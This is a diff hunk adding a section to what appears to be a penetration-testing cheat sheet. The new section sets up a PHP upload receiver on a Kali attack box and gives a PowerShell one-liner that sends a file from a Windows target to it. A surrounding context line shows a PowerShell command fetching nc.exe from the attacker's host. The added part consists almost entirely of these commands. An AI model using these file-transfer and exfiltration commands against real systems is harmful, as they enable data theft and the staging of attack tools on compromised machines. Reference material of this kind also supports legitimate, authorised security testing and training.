@@ -278,6 +278,24 @@ powershell Invoke-WebRequest -Uri http://[ip attack box]/nc.exe -OutFile C:\nc.e
 powershell $PSVersionTable.PsVersion
 ```
 
+### **Upload Windows data through HTTP Post request**
+
+make /var/www/upload.php on kali
+
+```
+<?php
+$uploaddir = '/var/www/';
+$uploadfile = $uploaddir . $_FILES['file']['name'];
+move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
+?>
+```
+
+Upload file in Windows client
+
+```
+powershell (New-Object System.Net.WebClient).UploadFile('http://<IP>/upload.php', '<FILE>')
+```
+
 ### **VBS download files for Windows XP**
 
 Create vbs script
